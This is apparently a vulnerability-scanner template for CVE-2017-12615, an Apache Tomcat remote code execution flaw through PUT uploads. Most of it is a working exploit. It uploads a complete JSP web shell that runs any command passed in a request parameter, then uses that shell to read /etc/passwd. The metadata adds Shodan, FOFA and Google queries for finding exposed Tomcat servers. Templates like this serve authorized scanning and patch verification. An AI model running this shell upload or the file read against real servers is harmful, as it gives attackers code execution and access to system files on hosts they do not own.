http:
- body: "<%@ page import=\"java.util.*,java.io.*\"%>\n<%\nif (request.getParameter(\"\
    cmd\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"\
    cmd\") + \"<BR>\");\n        Process p = Runtime.getRuntime().exec(request.getParameter(\"\
    cmd\"));\n        OutputStream os = p.getOutputStream();\n        InputStream\
    \ in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n\
    \        String disr = dis.readLine();\n        while ( disr != null ) {\n   \
    \             out.println(disr);\n                disr = dis.readLine();\n   \
    \             }\n        }\n%>\n"
  headers:
    Content-Type: application/x-www-form-urlencoded
  method: PUT
  path:
  - '{{BaseURL}}/poc.jsp/'
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/poc.jsp?cmd=cat+%2Fetc%2Fpasswd'
id: CVE-2017-12615
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:apache:tomcat:7.0:*:*:*:*:*:*:*
    cve-id: CVE-2017-12615
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-434
    epss-percentile: 0.99933
    epss-score: 0.94277
  description: 'Apache Tomcat servers 7.0.{0 to 79} are susceptible to remote code
    execution. By design, you are not allowed to upload JSP files via the PUT method.
    This is likely a security measure to prevent an attacker from uploading a JSP
    shell and gaining remote code execution on the server. However, due to the insufficient
    checks, an attacker could gain remote code execution on Apache Tomcat servers
    that have enabled PUT method by using a specially crafted HTTP request.

    '
  impact: 'Successful exploitation of this vulnerability allows an attacker to execute
    arbitrary code on the affected server.

    '
  metadata:
    fofa-query:
    - body="apache tomcat"
    - title="apache tomcat"
    google-query: intitle:"apache tomcat"
    max-request: 2
    product: tomcat
    shodan-query:
    - title:"Apache Tomcat"
    - http.title:"apache tomcat"
    - http.html:"apache tomcat"
    - cpe:"cpe:2.3:a:apache:tomcat"
    vendor: apache
  name: Apache Tomcat Servers - Remote Code Execution
  reference:
  - https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615
  - https://lists.apache.org/thread.html/8fcb1e2d5895413abcf266f011b9918ae03e0b7daceb118ffbf23f8c@%3Cannounce.tomcat.apache.org%3E
  - http://web.archive.org/web/20211206035549/https://securitytracker.com/id/1039392
  - https://nvd.nist.gov/vuln/detail/CVE-2017-12615
  - http://breaktoprotect.blogspot.com/2017/09/the-case-of-cve-2017-12615-tomcat-7-put.html
  remediation: 'Apply the latest security patches or upgrade to a non-vulnerable version
    of Apache Tomcat.

    '
  severity: high
  tags: cve2017,cve,rce,tomcat,kev,vulhub,apache,fileupload,intrusive,vkev,vuln
